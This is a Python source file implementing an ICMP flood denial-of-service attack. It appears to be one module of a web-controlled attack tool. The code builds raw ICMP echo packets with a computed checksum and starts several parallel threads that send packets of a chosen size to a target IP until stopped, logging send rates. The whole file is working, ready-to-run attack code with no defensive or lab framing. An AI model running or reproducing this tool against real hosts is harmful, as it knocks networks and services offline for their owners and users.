"""
ICMP Flood Attack Implementation
"""

import threading
import time
import socket
import struct
import os
from web.shared import attack_state, log_message

def checksum(source_string):
    """
    Calculate the checksum of a string
    """
    sum = 0
    count_to = (len(source_string) // 2) * 2
    for count in range(0, count_to, 2):
        this = source_string[count + 1] * 256 + source_string[count]
        sum = sum + this
        sum = sum & 0xffffffff

    if count_to < len(source_string):
        sum = sum + source_string[len(source_string) - 1]
        sum = sum & 0xffffffff

    sum = (sum >> 16) + (sum & 0xffff)
    sum = sum + (sum >> 16)
    answer = ~sum
    answer = answer & 0xffff
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer

def create_icmp_packet(id, seq, payload_size):
    """
    Create an ICMP echo request packet
    """
    # ICMP header
    type = 8  # ICMP Echo Request
    code = 0
    chksum = 0  # Initial checksum value
    identifier = id & 0xFFFF
    sequence = seq & 0xFFFF
    
    header = struct.pack('!BBHHH', type, code, chksum, identifier, sequence)
    
    # Create payload of specified size
    payload = bytearray([x & 0xFF for x in range(payload_size)])
    
    # Calculate checksum
    chksum = socket.htons(checksum(header + payload))
    
    # Create final header with checksum
    header = struct.pack('!BBHHH', type, code, chksum, identifier, sequence)
    
    return header + payload

def flood_thread(target_ip, packet_size, interval, thread_id):
    """
    Individual flooding thread
    """
    try:
        # Create raw socket
        if os.name == "nt":
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        seq = 0
        packets_sent = 0
        start_time = time.time()
        
        while attack_state['running']:
            try:
                # Create and send packet
                packet = create_icmp_packet(thread_id, seq, packet_size - 8)  # -8 for ICMP header
                sock.sendto(packet, (target_ip, 0))
                
                packets_sent += 1
                seq = (seq + 1) & 0xFFFF
                
                # Log progress every 1000 packets
                if packets_sent % 1000 == 0:
                    elapsed = time.time() - start_time
                    rate = packets_sent / elapsed if elapsed > 0 else 0
                    log_message(f"[+] Thread {thread_id}: Sent {packets_sent} packets ({rate:.2f} packets/sec)")
                
                if interval > 0:
                    time.sleep(interval / 1000.0)  # Convert ms to seconds
                    
            except Exception as e:
                log_message(f"[-] Error sending packet in thread {thread_id}: {str(e)}", "error")
                # Continue the loop even if one packet fails
                continue
                
    except Exception as e:
        log_message(f"[-] Thread {thread_id} error: {str(e)}", "error")
    finally:
        sock.close()

def launch_icmp_flood_attack(config):
    """
    Launch ICMP flood attack
    
    Args:
        config (dict): Attack configuration containing:
            - target_ip: Target IP address
            - packet_size: Size of ICMP packets in bytes
            - interval: Delay between packets in milliseconds
            - thread_count: Number of parallel flooding threads
    """
    try:
        # Extract and validate configuration
        if not isinstance(config, dict):
            raise ValueError("Configuration must be a dictionary")
            
        # Get required parameters
        target_ip = config.get('target_ip')
        if not target_ip:
            raise ValueError("Target IP is required")
            
        packet_size = config.get('packet_size', 56)
        interval = config.get('interval', 0)
        thread_count = config.get('thread_count', 4)
        
        # Validate packet size
        if packet_size < 32 or packet_size > 65500:
            raise ValueError("Invalid packet size. Must be between 32 and 65500 bytes.")
        
        # Start flooding threads
        threads = []
        log_message(f"[+] Starting ICMP flood attack against {target_ip}")
        log_message(f"[+] Packet size: {packet_size} bytes")
        log_message(f"[+] Interval: {interval}ms")
        log_message(f"[+] Threads: {thread_count}")
        
        for i in range(thread_count):
            thread = threading.Thread(
                target=flood_thread,
                args=(target_ip, packet_size, interval, i)
            )
            thread.daemon = True
            thread.start()
            threads.append(thread)
            log_message(f"[+] Started flooding thread {i}")
        
        # Wait for threads to complete
        while attack_state['running']:
            time.sleep(1)
            
        # Wait for threads to finish
        for thread in threads:
            thread.join()
            
        log_message("[+] ICMP flood attack completed")
        
    except Exception as e:
        log_message(f"[-] Error in ICMP flood attack: {str(e)}", "error")
        raise 